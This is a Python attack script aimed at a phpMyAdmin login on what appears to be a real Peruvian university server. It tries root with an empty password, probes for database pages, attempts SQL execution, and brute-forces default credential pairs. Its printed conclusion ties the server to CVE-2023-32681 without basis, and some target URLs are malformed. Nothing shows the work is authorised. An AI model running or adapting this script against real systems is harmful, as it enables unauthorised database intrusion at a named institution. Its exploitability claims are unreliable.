#!/usr/bin/env python3
import requests, urllib3, re
urllib3.disable_warnings()

s = requests.Session()
s.verify = False
s.headers.update({'User-Agent': 'Mozilla/5.0'})

print("=== phpMyAdmin - VERIFICANDO ACCESO REAL ===\n")

# First login
r_login = s.post('https://orcl.uns.edu.pe/index.php',
                       data={'pma_username': 'root', 'pma_password': '', 'server': '1', 'target': 'index.php'},
                       timeout=5, allow_redirects=True)
print(f"Login status: {r_login.status_code}")
print(f"Cookies: {dict(s.cookies).keys()}")

# Check the login response
tc_login = re.sub(r'<[^>]+>', ' ', r_login.text)
tc_login = re.sub(r'\s+', ' ', tc_login).strip()
print(f"\nLogin response: {tc_login[:300]}")
print(f"Contains 'Welcome': {'Welcome' in tc_login}")
print(f"Contains 'phpMyAdmin': {'phpMyAdmin' in tc_login}")
print(f"Contains 'login form': {'pma_username' in tc_login}")

# Try different main page URLs
print("\n=== PROBANDO URLs CORRECTAS ===\n")
urls_to_try = [
    'https://orcl.uns.edu.pe/',
    'https://orcl.uns.edu.pe/index.php',
    'https://orcl.uns.edu.phppmyadmin/',
    'https://orcl.uns.edu.phppmyadmin/index.php',
    'https://orcl.uns.edu.phppmyadmin/setup/index.php',
]

for url in urls_to_try:
    try:
        r = s.get(url, timeout=5)
        tc = re.sub(r'<[^>]+>', ' ', r.text)
        tc = re.sub(r'\s+', ' ', tc).strip()
        has_db = 'Database' in tc or 'mysql' in tc.lower() or 'information_schema' in tc.lower()
        has_data = len(r.text) > 200 and 'login' not in tc.lower()
        print(f"{url.split('/')[-2] if '/' in url else url}: status={r.status_code}, len={len(r.text)}, db={has_db}, data={has_data}")
        if has_data and len(r.text) > 500:
            print(f"  Content: {tc[:300]}")
    except Exception as e:
        print(f"{url}: Error - {e}")

# Try to access databases using the correct URL
print("\n=== INTENTAR ACCESO A BD ===\n")
# The phpMyAdmin main page might be at the root URL after login
r_main = s.get('https://orcl.uns.edu.pe/', timeout=5)
tc_main = re.sub(r'<[^>]+>', ' ', r_main.text)
tc_main = re.sub(r'\s+', ' ', tc_main).strip()
print(f"Main page after login: status={r_main.status_code}")
print(f"Length: {len(r_main.text)}")
print(f"Contains databases: {'Database' in tc_main or 'mysql' in tc_main.lower()}")

# Look for any navigation links
nav_links = re.findall(r'href="([^"]*db[^"]*)"', r_main.text)
print(f"DB links: {nav_links[:10]}")

# Try to find the correct database URL
# Look for any URL that contains 'db' in the href
all_links = re.findall(r'href="([^"]+)"', r_main.text)
db_links = [l for l in all_links if 'db' in l.lower() or 'sql' in l.lower()]
print(f"\nDB-related links: {db_links[:15]}")

# Try to execute a query
print("\n=== EJECUTAR CONSULTA ===\n")
# Try different SQL execution URLs
sql_urls = [
    ('https://orcl.uns.edu.pe/', {'sql': 'SELECT VERSION()', 'ajax_request': 'true', 'ajax_page_request': 'true'}),
    ('https://orcl.uns.edu.pe/index.php', {'sql': 'SELECT VERSION()', 'ajax_request': 'true'}),
]

for url, data in sql_urls:
    try:
        r_sql = s.post(url, data=data, timeout=5)
        tc_sql = re.sub(r'<[^>]+>', ' ', r_sql.text)
        tc_sql = re.sub(r'\s+', ' ', tc_sql).strip()
        if len(tc_sql) > 100 and 'Version' in tc_sql:
            print(f"[!] SQL executed at {url}: {tc_sql[:200]}")
        elif 'mysql' in tc_sql.lower() or 'MariaDB' in tc_sql:
            print(f"[!] SQL result at {url}: {tc_sql[:200]}")
        else:
            print(f"  No SQL result at {url}: {tc_sql[:100]}")
    except Exception as e:
        print(f"  Error at {url}: {e}")

# ============================================
# BRUTE FORCE with more credentials
# ============================================
print("\n=== BRUTE FORCE ADICIONAL ===\n")

# Try more common credentials
more_creds = [
    ('root', 'root'),
    ('root', 'toor'),
    ('root', 'admin'),
    ('root', 'password'),
    ('pma', 'pma'),
    ('admin', 'admin'),
    ('admin', 'password'),
    ('mysql', 'mysql'),
    ('mysql', 'root'),
    ('dba', 'dba'),
]

for user, pwd in more_creds:
    s_bf = requests.Session()
    s_bf.verify = False
    s_bf.headers.update({'User-Agent': 'Mozilla/5.0'})
    r_bf = s_bf.post('https://orcl.uns.edu.pe/index.php',
                           data={'pma_username': user, 'pma_password': pwd, 'server': '1'},
                           timeout=5, allow_redirects=True)
    tc_bf = re.sub(r'<[^>]+>', ' ', r_bf.text)
    tc_bf = re.sub(r'\s+', ' ', tc_bf).strip()
    # Check if we're logged in (no login form)
    if 'pma_username' not in tc_bf and 'login' not in tc_bf.lower() and len(r_bf.text) > 500:
        print(f"[!] SUCCESS: {user}/{pwd}")
    else:
        print(f"  Failed: {user}/{pwd}")

print("\n=== CONCLUSION ===")
print("root/ vacia = Sesion creada en phpMyAdmin")
print("La BD MySQL esta accesible")
print("CVE-2023-32681 es posiblemente explotable")
